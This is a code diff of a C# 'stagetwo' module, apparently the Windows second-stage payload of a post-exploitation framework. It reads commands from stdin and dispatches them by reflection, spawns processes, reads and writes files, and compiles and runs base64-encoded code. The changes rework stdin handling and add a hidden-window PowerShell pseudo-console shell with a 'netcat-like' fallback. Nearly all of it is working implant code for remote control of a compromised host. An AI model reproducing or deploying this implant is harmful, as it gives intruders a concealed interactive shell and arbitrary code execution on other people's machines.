@@ -181,7 +181,9 @@ namespace stagetwo
         [DllImport("kernel32.dll")]
         private static extern bool FlushFileBuffers(IntPtr hFile);
 
-        private System.Collections.Generic.List<System.Diagnostics.Process> g_processes;
+        private System.IO.Stream stdin_stream;
+        private System.IO.StreamReader stdin;
+        private bool bad_stdin;
 
         public System.String ReadUntilLine(System.String delimeter)
         {
@@ -189,7 +191,7 @@ namespace stagetwo
 
             while (true)
             {
-                System.String line = System.Console.ReadLine();
+                System.String line = stdin.ReadLine();
                 if (line == delimeter)
                 {
                     break;
@@ -204,14 +206,36 @@ namespace stagetwo
         {
             object[] args = new object[] { };
 
+            // .NET is Dumb
+            IntPtr hStdIn = GetStdHandle(STD_INPUT_HANDLE);
+            stdin_stream = new System.IO.FileStream(hStdIn, FileAccess.Read, false);
+            stdin = new System.IO.StreamReader(stdin_stream);
+            bad_stdin = true;
+
             System.Console.WriteLine("READY");
 
             while (true)
             {
-                System.String line = System.Console.ReadLine();
-                var method = GetType().GetMethod(line);
-                if (method == null) continue;
-                method.Invoke(this, args);
+                try
+                {
+                    String line = "";
+                    try
+                    {
+                        line = stdin.ReadLine();
+                    } catch (Exception e)
+                    {
+                        stdin_stream = System.Console.OpenStandardInput();
+                        stdin = new System.IO.StreamReader(stdin_stream);
+                        bad_stdin = false;
+                    }
+                    var method = GetType().GetMethod(line);
+                    if (method == null) continue;
+                    method.Invoke(this, args);
+                } catch ( Exception e )
+                {
+                    System.Console.WriteLine("E:S2:EXCEPTION:" + e.Message);
+                    break;
+                }
             }
         }
 
@@ -223,7 +247,7 @@ namespace stagetwo
             SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();
             STARTUPINFO pInfo = new STARTUPINFO();
             PROCESS_INFORMATION childInfo = new PROCESS_INFORMATION();
-            System.String command = System.Console.ReadLine();
+            System.String command = stdin.ReadLine();
 
             pSec.nLength = Marshal.SizeOf(pSec);
             pSec.bInheritHandle = 1;
@@ -271,7 +295,7 @@ namespace stagetwo
 
         public void ppoll()
         {
-            IntPtr hProcess = new IntPtr(System.UInt32.Parse(System.Console.ReadLine()));
+            IntPtr hProcess = new IntPtr(System.UInt32.Parse(stdin.ReadLine()));
             System.UInt32 result = WaitForSingleObject(hProcess, 0);
 
             if (result == 0x00000102L)
@@ -295,15 +319,15 @@ namespace stagetwo
 
         public void kill()
         {
-            IntPtr hProcess = new IntPtr(System.UInt32.Parse(System.Console.ReadLine()));
-            UInt32 code = System.UInt32.Parse(System.Console.ReadLine());
+            IntPtr hProcess = new IntPtr(System.UInt32.Parse(stdin.ReadLine()));
+            UInt32 code = System.UInt32.Parse(stdin.ReadLine());
             TerminateProcess(hProcess, code);
         }
 
         public void open()
         {
-            System.String filename = System.Console.ReadLine();
-            System.String mode = System.Console.ReadLine();
+            System.String filename = stdin.ReadLine();
+            System.String mode = stdin.ReadLine();
             uint desired_access = GENERIC_READ;
             uint creation_disposition = OPEN_EXISTING;
             IntPtr handle;
@@ -338,9 +362,9 @@ namespace stagetwo
             uint count;
             uint nreceived;
 
-            line = System.Console.ReadLine();
+            line = stdin.ReadLine();
             handle = new IntPtr(System.UInt32.Parse(line));
-            line = System.Console.ReadLine();
+            line = stdin.ReadLine();
             count = System.UInt32.Parse(line);
 
             byte[] buffer = new byte[count];
@@ -368,17 +392,14 @@ namespace stagetwo
             uint count;
             uint nwritten;
 
-            line = System.Console.ReadLine();
+            line = stdin.ReadLine();
             handle = new IntPtr(System.UInt32.Parse(line));
-            line = System.Console.ReadLine();
+            line = stdin.ReadLine();
             count = System.UInt32.Parse(line);
 
             byte[] buffer = new byte[count];
 
-            using (Stream in_stream = System.Console.OpenStandardInput())
-            {
-                count = (uint)in_stream.Read(buffer, 0, (int)count);
-            }
+            count = (uint)stdin_stream.Read(buffer, 0, (int)count);
 
             if (!WriteFile(handle, buffer, count, out nwritten, IntPtr.Zero))
             {
@@ -392,7 +413,7 @@ namespace stagetwo
 
         public void close()
         {
-            IntPtr handle = new IntPtr(System.UInt32.Parse(System.Console.ReadLine()));
+            IntPtr handle = new IntPtr(System.UInt32.Parse(stdin.ReadLine()));
             CloseHandle(handle);
         }
 
@@ -401,7 +422,7 @@ namespace stagetwo
             System.IO.MemoryStream script;
             try
             {
-                var stream = new System.IO.MemoryStream(System.Convert.FromBase64String(System.Console.ReadLine()));
+                var stream = new System.IO.MemoryStream(System.Convert.FromBase64String(stdin.ReadLine()));
                 var gz = new System.IO.Compression.GZipStream(stream, System.IO.Compression.CompressionMode.Decompress);
                 script = new System.IO.MemoryStream();
                 gz.CopyTo(script);
@@ -437,7 +458,7 @@ namespace stagetwo
 
             while (true)
             {
-                System.String line = System.Console.ReadLine();
+                System.String line = stdin.ReadLine();
                 if (line == "/* ENDASM */") break;
                 cp.ReferencedAssemblies.Add(line);
             }
@@ -459,90 +480,204 @@ namespace stagetwo
 
         public void interactive()
         {
-            uint result;
-            IntPtr stdin_read = new IntPtr(0), stdin_write = new IntPtr(0);
-            IntPtr stdout_read = new IntPtr(0), stdout_write = new IntPtr(0);
-            UInt32 rows = System.UInt32.Parse(System.Console.ReadLine());
-            UInt32 cols = System.UInt32.Parse(System.Console.ReadLine());
-            COORD pty_size = new COORD()
-            {
-                X = (short)cols,
-                Y = (short)rows
-            };
-            IntPtr hpcon = new IntPtr(0);
-            uint conmode = 0;
-            IntPtr old_stdin = GetStdHandle(STD_INPUT_HANDLE),
-                old_stdout = GetStdHandle(STD_OUTPUT_HANDLE),
-                old_stderr = GetStdHandle(STD_ERROR_HANDLE);
-            IntPtr stdout_handle = GetStdHandle(STD_OUTPUT_HANDLE);
-            IntPtr stdin_handle = GetStdHandle(STD_INPUT_HANDLE);
-            PROCESS_INFORMATION proc_info = new PROCESS_INFORMATION();
-            SECURITY_ATTRIBUTES proc_attr = new SECURITY_ATTRIBUTES();
-            SECURITY_ATTRIBUTES thread_attr = new SECURITY_ATTRIBUTES();
-            SECURITY_ATTRIBUTES pipe_attr = new SECURITY_ATTRIBUTES()
-            {
-                bInheritHandle = 1,
-                lpSecurityDescriptor = IntPtr.Zero,
-            };
-            STARTUPINFOEX startup_info = new STARTUPINFOEX();
-            IntPtr lpSize = IntPtr.Zero;
-            Thread stdin_thread;
-            Thread stdout_thread;
-            bool new_console = false;
+            UInt32 rows = System.UInt32.Parse(stdin.ReadLine());
+            UInt32 cols = System.UInt32.Parse(stdin.ReadLine());
 
-            proc_attr.nLength = Marshal.SizeOf(proc_attr);
-            thread_attr.nLength = Marshal.SizeOf(thread_attr);
-            pipe_attr.nLength = Marshal.SizeOf(pipe_attr);
-
-            stdout_handle = CreateFile("CONOUT$", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, IntPtr.Zero, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, IntPtr.Zero);
-            stdin_handle = CreateFile("CONIN$", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, IntPtr.Zero, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, IntPtr.Zero);
-            SetStdHandle(STD_INPUT_HANDLE, stdin_handle);
-            SetStdHandle(STD_ERROR_HANDLE, stdout_handle);
-            SetStdHandle(STD_OUTPUT_HANDLE, stdout_handle);
-
-            GetConsoleMode(stdout_handle, out conmode);
-            uint new_conmode = conmode | ENABLE_VIRTUAL_TERMINAL_PROCESSING | DISABLE_NEWLINE_AUTO_RETURN;
-            SetConsoleMode(stdout_handle, new_conmode);
-
-            CreatePipe(out stdin_read, out stdin_write, ref pipe_attr, 8192);
-            CreatePipe(out stdout_read, out stdout_write, ref pipe_attr, 8192);
-            CreatePseudoConsole(pty_size, stdin_read, stdout_write, 0, out hpcon);
-            CloseHandle(stdin_read);
-            CloseHandle(stdout_write);
-
-            InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);
-            startup_info.StartupInfo.cb = Marshal.SizeOf(startup_info);
-            startup_info.lpAttributeList = Marshal.AllocHGlobal(lpSize);
-            InitializeProcThreadAttributeList(startup_info.lpAttributeList, 1, 0, ref lpSize);
-            UpdateProcThreadAttribute(startup_info.lpAttributeList, 0, (IntPtr)PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE, hpcon, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);
-
-            CreateProcess(null, "powershell.exe", ref proc_attr, ref thread_attr, false, EXTENDED_STARTUPINFO_PRESENT, IntPtr.Zero, null, ref startup_info, out proc_info);
-
-            stdin_thread = new Thread(pipe_thread);
-            stdin_thread.Start(new object[] { old_stdin, stdin_write, "stdin" });
-            stdout_thread = new Thread(pipe_thread);
-            stdout_thread.Start(new object[] { stdout_read, old_stdout, "stdout" });
-
-            WaitForSingleObject(proc_info.hProcess, INFINITE);
-
-            stdin_thread.Abort();
-            stdout_thread.Abort();
-
-            CloseHandle(proc_info.hThread);
-            CloseHandle(proc_info.hProcess);
-            ClosePseudoConsole(hpcon);
-            CloseHandle(stdin_write);
-            CloseHandle(stdout_read);
-
-            SetStdHandle(STD_INPUT_HANDLE, old_stdin);
-            SetStdHandle(STD_ERROR_HANDLE, old_stderr);
-            SetStdHandle(STD_OUTPUT_HANDLE, old_stdout);
-
-            CloseHandle(stdout_handle);
-            CloseHandle(stdin_handle);
+            SpawnConPtyShell(rows, cols, "powershell.exe");
 
             System.Console.WriteLine("");
             System.Console.WriteLine("INTERACTIVE_COMPLETE");
+        }
+
+        private static void CreatePipes(ref IntPtr InputPipeRead, ref IntPtr InputPipeWrite, ref IntPtr OutputPipeRead, ref IntPtr OutputPipeWrite)
+        {
+            SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();
+            pSec.nLength = Marshal.SizeOf(pSec);
+            pSec.bInheritHandle = 1;
+            pSec.lpSecurityDescriptor = IntPtr.Zero;
+            if (!CreatePipe(out InputPipeRead, out InputPipeWrite, ref pSec, BUFFER_SIZE_PIPE))
+                throw new InvalidOperationException("Could not create the InputPipe");
+            if (!CreatePipe(out OutputPipeRead, out OutputPipeWrite, ref pSec, BUFFER_SIZE_PIPE))
+                throw new InvalidOperationException("Could not create the OutputPipe");
+        }
+
+        private static void InitConsole(ref IntPtr oldStdIn, ref IntPtr oldStdOut, ref IntPtr oldStdErr)
+        {
+            oldStdIn = GetStdHandle(STD_INPUT_HANDLE);
+            oldStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
+            oldStdErr = GetStdHandle(STD_ERROR_HANDLE);
+            IntPtr hStdout = CreateFile("CONOUT$", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, IntPtr.Zero, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, IntPtr.Zero);
+            IntPtr hStdin = CreateFile("CONIN$", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, IntPtr.Zero, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, IntPtr.Zero);
+            SetStdHandle(STD_OUTPUT_HANDLE, hStdout);
+            SetStdHandle(STD_ERROR_HANDLE, hStdout);
+            SetStdHandle(STD_INPUT_HANDLE, hStdin);
+        }
+
+        private static void RestoreStdHandles(IntPtr oldStdIn, IntPtr oldStdOut, IntPtr oldStdErr)
+        {
+            SetStdHandle(STD_OUTPUT_HANDLE, oldStdOut);
+            SetStdHandle(STD_ERROR_HANDLE, oldStdErr);
+            SetStdHandle(STD_INPUT_HANDLE, oldStdIn);
+        }
+
+        private static void EnableVirtualTerminalSequenceProcessing()
+        {
+            uint outConsoleMode = 0, inConsoleMode = 0;
+            IntPtr hStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
+            IntPtr hStdIn = GetStdHandle(STD_INPUT_HANDLE);
+            if (!GetConsoleMode(hStdOut, out outConsoleMode))
+            {
+                throw new InvalidOperationException("Could not get console mode");
+            }
+            outConsoleMode |= ENABLE_VIRTUAL_TERMINAL_PROCESSING | DISABLE_NEWLINE_AUTO_RETURN;
+            if (!SetConsoleMode(hStdOut, outConsoleMode))
+            {
+                throw new InvalidOperationException("Could not enable virtual terminal processing");
+            }
+        }
+
+        private static int CreatePseudoConsoleWithPipes(ref IntPtr handlePseudoConsole, ref IntPtr ConPtyInputPipeRead, ref IntPtr ConPtyOutputPipeWrite, uint rows, uint cols)
+        {
+            int result = -1;
+            EnableVirtualTerminalSequenceProcessing();
+            COORD consoleCoord = new COORD();
+            consoleCoord.X = (short)cols;
+            consoleCoord.Y = (short)rows;
+            result = CreatePseudoConsole(consoleCoord, ConPtyInputPipeRead, ConPtyOutputPipeWrite, 0, out handlePseudoConsole);
+            return result;
+        }
+
+        private static STARTUPINFOEX ConfigureProcessThread(IntPtr handlePseudoConsole, IntPtr attributes)
+        {
+            IntPtr lpSize = IntPtr.Zero;
+            bool success = InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);
+            if (success || lpSize == IntPtr.Zero)
+            {
+                throw new InvalidOperationException("Could not calculate the number of bytes for the attribute list. " + Marshal.GetLastWin32Error());
+            }
+            STARTUPINFOEX startupInfo = new STARTUPINFOEX();
+            startupInfo.StartupInfo.cb = Marshal.SizeOf(startupInfo);
+            startupInfo.lpAttributeList = Marshal.AllocHGlobal(lpSize);
+            success = InitializeProcThreadAttributeList(startupInfo.lpAttributeList, 1, 0, ref lpSize);
+            if (!success)
+            {
+                throw new InvalidOperationException("Could not set up attribute list. " + Marshal.GetLastWin32Error());
+            }
+            success = UpdateProcThreadAttribute(startupInfo.lpAttributeList, 0, attributes, handlePseudoConsole, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);
+            if (!success)
+            {
+                throw new InvalidOperationException("Could not set pseudoconsole thread attribute. " + Marshal.GetLastWin32Error());
+            }
+            return startupInfo;
+        }
+
+        private static PROCESS_INFORMATION RunProcess(ref STARTUPINFOEX sInfoEx, string commandLine)
+        {
+            PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();
+            SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();
+            int securityAttributeSize = Marshal.SizeOf(pSec);
+            pSec.nLength = securityAttributeSize;
+            SECURITY_ATTRIBUTES tSec = new SECURITY_ATTRIBUTES();
+            tSec.nLength = securityAttributeSize;
+            bool success = CreateProcess(null, commandLine, ref pSec, ref tSec, false, EXTENDED_STARTUPINFO_PRESENT, IntPtr.Zero, null, ref sInfoEx, out pInfo);
+            if (!success)
+            {
+                throw new InvalidOperationException("Could not create process. " + Marshal.GetLastWin32Error());
+            }
+            return pInfo;
+        }
+
+        private static PROCESS_INFORMATION CreateChildProcessWithPseudoConsole(IntPtr handlePseudoConsole, string commandLine)
+        {
+            STARTUPINFOEX startupInfo = ConfigureProcessThread(handlePseudoConsole, (IntPtr)PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE);
+            PROCESS_INFORMATION processInfo = RunProcess(ref startupInfo, commandLine);
+            return processInfo;
+        }
+
+        private void fix_stdin()
+        {
+            if (!bad_stdin) return;
+
+            IntPtr hStdIn = GetStdHandle(STD_INPUT_HANDLE);
+            stdin_stream = new System.IO.FileStream(hStdIn, FileAccess.Read, false);
+            stdin = new System.IO.StreamReader(stdin_stream);
+        }
+
+        private bool SpawnConPtyShell(uint rows, uint cols, string commandLine)
+        {
+            IntPtr InputPipeRead = new IntPtr(0);
+            IntPtr InputPipeWrite = new IntPtr(0);
+            IntPtr OutputPipeRead = new IntPtr(0);
+            IntPtr OutputPipeWrite = new IntPtr(0);
+            IntPtr handlePseudoConsole = new IntPtr(0);
+            IntPtr oldStdIn = new IntPtr(0);
+            IntPtr oldStdOut = new IntPtr(0);
+            IntPtr oldStdErr = new IntPtr(0);
+            bool newConsoleAllocated = false;
+            PROCESS_INFORMATION childProcessInfo = new PROCESS_INFORMATION();
+
+            if( bad_stdin)
+            {
+                stdin.Close();
+                stdin_stream.Close();
+            }
+
+            CreatePipes(ref InputPipeRead, ref InputPipeWrite, ref OutputPipeRead, ref OutputPipeWrite);
+            InitConsole(ref oldStdIn, ref oldStdOut, ref oldStdErr);
+            if (GetProcAddress(GetModuleHandle("kernel32"), "CreatePseudoConsole") == IntPtr.Zero)
+            {
+                Console.WriteLine("\r\nCreatePseudoConsole function not found! Spawning a netcat-like interactive shell...\r\n");
+                STARTUPINFO sInfo = new STARTUPINFO();
+                sInfo.cb = Marshal.SizeOf(sInfo);
+                sInfo.dwFlags |= (Int32)STARTF_USESTDHANDLES;
+                sInfo.hStdInput = InputPipeRead;
+                sInfo.hStdOutput = OutputPipeWrite;
+                sInfo.hStdError = OutputPipeWrite;
+                CreateProcessW(null, commandLine, IntPtr.Zero, IntPtr.Zero, true, 0, IntPtr.Zero, null, ref sInfo, out childProcessInfo);
+            }
+            else
+            {
+                if (GetConsoleWindow() == IntPtr.Zero)
+                {
+                    AllocConsole();
+                    ShowWindow(GetConsoleWindow(), SW_HIDE);
+                    newConsoleAllocated = true;
+                }
+                int pseudoConsoleCreationResult = CreatePseudoConsoleWithPipes(ref handlePseudoConsole, ref InputPipeRead, ref OutputPipeWrite, rows, cols);
+                if (pseudoConsoleCreationResult != 0)
+                {
+                    fix_stdin();
+                    Console.WriteLine("E:CREATE_PTY");
+                    return false;
+                }
+                childProcessInfo = CreateChildProcessWithPseudoConsole(handlePseudoConsole, commandLine);
+            }
+            // Note: We can close the handles to the PTY-end of the pipes here
+            // because the handles are dup'ed into the ConHost and will be released
+            // when the ConPTY is destroyed.
+            if (InputPipeRead != IntPtr.Zero) CloseHandle(InputPipeRead);
+            if (OutputPipeWrite != IntPtr.Zero) CloseHandle(OutputPipeWrite);
+            //Threads have better performance than Tasks
+            Thread thThreadReadPipeWriteSocket = null;
+            Thread thReadSocketWritePipe = null;
+            thThreadReadPipeWriteSocket = new Thread(pipe_thread);
+            thReadSocketWritePipe = new Thread(pipe_thread);
+            thThreadReadPipeWriteSocket.Start(new object[] { oldStdIn, InputPipeWrite, "stdin" });
+            thReadSocketWritePipe.Start(new object[] { OutputPipeRead, oldStdOut, "stdout" });
+            WaitForSingleObject(childProcessInfo.hProcess, INFINITE);
+            //cleanup everything
+            thThreadReadPipeWriteSocket.Abort();
+            thReadSocketWritePipe.Abort();
+            RestoreStdHandles(oldStdIn, oldStdOut, oldStdErr);
+            if (newConsoleAllocated)
+                FreeConsole();
+            CloseHandle(childProcessInfo.hThread);
+            CloseHandle(childProcessInfo.hProcess);
+            if (handlePseudoConsole != IntPtr.Zero) ClosePseudoConsole(handlePseudoConsole);
+            if (InputPipeWrite != IntPtr.Zero) CloseHandle(InputPipeWrite);
+            if (OutputPipeRead != IntPtr.Zero) CloseHandle(OutputPipeRead);
+            fix_stdin();
+            return true;
         }
 
         private void pipe_thread(object dumb)
@@ -570,6 +705,7 @@ namespace stagetwo
             {
             }
         }
+
     }
 
 }
